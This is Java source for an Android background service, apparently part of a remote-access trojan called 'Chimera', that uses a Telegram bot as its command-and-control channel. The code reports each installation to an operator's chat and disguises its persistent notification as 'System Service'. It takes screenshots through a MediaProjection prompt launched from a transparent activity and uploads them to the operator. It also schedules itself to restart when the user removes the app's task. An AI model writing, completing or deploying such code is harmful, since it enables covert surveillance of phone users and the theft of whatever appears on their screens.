package com.chimera;

import android.app.Activity;
import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.util.DisplayMetrics;
import android.view.WindowManager;

import java.io.File;
import java.io.FileOutputStream;
import java.nio.ByteBuffer;

public class TelegramC2Service extends Service {

    private Thread workerThread;
    private HandlerThread screenshotThread;
    private Handler screenshotHandler;
    private ImageReader imageReader;
    private VirtualDisplay virtualDisplay;
    private static MediaProjection mediaProjection;

    private static final String CHANNEL_ID = "chimeraChannel";
    private static final int NOTIFICATION_ID = 1;

    @Override
    public void onCreate() {
        super.onCreate();

        try {
            ConfigLoader.load(this);
            sendInstallMessage();
        } catch (Exception e) {
            ErrorLogger.logError(this, "TelegramC2Service_Config", e);
        }

        createNotificationChannel();
        startForeground(NOTIFICATION_ID, createNotification()); // safe foreground types only

        // start bot worker thread
        startWorker();

        // screenshot handler thread
        screenshotThread = new HandlerThread("Screenshot");
        screenshotThread.start();
        screenshotHandler = new Handler(screenshotThread.getLooper());
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel chan = new NotificationChannel(CHANNEL_ID, "Chimera Service", NotificationManager.IMPORTANCE_LOW);
            NotificationManager nm = getSystemService(NotificationManager.class);
            nm.createNotificationChannel(chan);
        }
    }

    private Notification createNotification() {
        Notification.Builder builder;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder = new Notification.Builder(this, CHANNEL_ID);
        } else {
            builder = new Notification.Builder(this);
        }
        builder.setContentTitle("System Service");
        builder.setSmallIcon(android.R.drawable.stat_notify_sync);
        return builder.build();
    }

    private void startWorker() {
        try {
            if (workerThread == null || !workerThread.isAlive()) {
                workerThread = new Thread(new TelegramBotWorker(this));
                workerThread.start();
            }
        } catch (Exception e) {
            ErrorLogger.logError(this, "TelegramC2Service_StartWorker", e);
        }
    }

    private void sendInstallMessage() {
        try {
            String token = ConfigLoader.getBotToken();
            long chat = ConfigLoader.getAdminId();
            if (token == null || chat == 0) return;
            String url = "https://api.telegram.org/bot" + token + "/sendMessage";
            String body = "{\"chat_id\":" + chat + ",\"text\":\"Chimera installed and running\"}";
            TelegramBotWorker.post(url, body, this);
        } catch (Exception e) {
            ErrorLogger.logError(this, "Service_SendInstall", e);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            String action = intent.getAction();
            if ("ACTION_PREPARE_SCREENSHOT".equals(action)) {
                // Launch transparent activity to request MediaProjection
                Intent activityIntent = new Intent(this, ScreenshotActivity.class);
                activityIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(activityIntent);
            } else if ("ACTION_SCREENSHOT_RESULT".equals(action)) {
                int resultCode = intent.getIntExtra("resultCode", Activity.RESULT_CANCELED);
                Intent resultData = intent.getParcelableExtra("resultData");
                handleScreenshotResult(resultCode, resultData);
            }
        }
        return START_STICKY;
    }

    private void handleScreenshotResult(int resultCode, Intent data) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                // Now safe to promote to MediaProjection FGS
                startForeground(NOTIFICATION_ID, createNotification(), ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);
            }

            MediaProjectionManager projectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            mediaProjection = projectionManager.getMediaProjection(resultCode, data);
            if (mediaProjection != null) {
                captureScreenshot();
            }
        } catch (Exception e) {
            ErrorLogger.logError(this, "HandleScreenshotResult", e);
        }
    }

    private void captureScreenshot() {
        try {
            WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
            DisplayMetrics metrics = new DisplayMetrics();
            wm.getDefaultDisplay().getRealMetrics(metrics);

            int width = metrics.widthPixels;
            int height = metrics.heightPixels;
            int density = metrics.densityDpi;

            imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
            virtualDisplay = mediaProjection.createVirtualDisplay(
                    "ScreenCapture", width, height, density,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                    imageReader.getSurface(), null, screenshotHandler
            );

            imageReader.setOnImageAvailableListener(reader -> {
                Image image = null;
                try {
                    image = reader.acquireLatestImage();
                    if (image != null) {
                        Image.Plane[] planes = image.getPlanes();
                        ByteBuffer buffer = planes[0].getBuffer();
                        int pixelStride = planes[0].getPixelStride();
                        int rowStride = planes[0].getRowStride();
                        int rowPadding = rowStride - pixelStride * width;

                        Bitmap bitmap = Bitmap.createBitmap(width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888);
                        bitmap.copyPixelsFromBuffer(buffer);

                        File outputFile = new File(getExternalFilesDir(null), "screenshot.jpg");
                        try (FileOutputStream fos = new FileOutputStream(outputFile)) {
                            bitmap.compress(Bitmap.CompressFormat.JPEG, 90, fos);
                        }

                        TelegramBotWorker.uploadFile(outputFile.getAbsolutePath(), ConfigLoader.getAdminId(), "Screenshot", this);
                        stopScreenshot();
                    }
                } catch (Exception e) {
                    ErrorLogger.logError(this, "ScreenshotCapture", e);
                } finally {
                    if (image != null) image.close();
                }
            }, screenshotHandler);

        } catch (Exception e) {
            ErrorLogger.logError(this, "captureScreenshot", e);
        }
    }

    private void stopScreenshot() {
        if (virtualDisplay != null) virtualDisplay.release();
        if (imageReader != null) imageReader.close();
        if (mediaProjection != null) mediaProjection.stop();
    }

    @Override
    public void onDestroy() {
        try {
            if (workerThread != null) workerThread.interrupt();
            if (screenshotThread != null) screenshotThread.quitSafely();
            stopScreenshot();
        } catch (Exception e) {
            ErrorLogger.logError(this, "TelegramC2Service_OnDestroy", e);
        }
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        try {
            Intent restartIntent = new Intent(getApplicationContext(), this.getClass());
            restartIntent.setPackage(getPackageName());
            PendingIntent pi = PendingIntent.getService(getApplicationContext(), 1000, restartIntent,
                    PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE);
            AlarmManager am = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
            am.set(AlarmManager.ELAPSED_REALTIME, System.currentTimeMillis() + 1000, pi);
        } catch (Exception e) {
            ErrorLogger.logError(this, "TelegramC2Service_OnTaskRemoved", e);
        }
        super.onTaskRemoved(rootIntent);
    }
}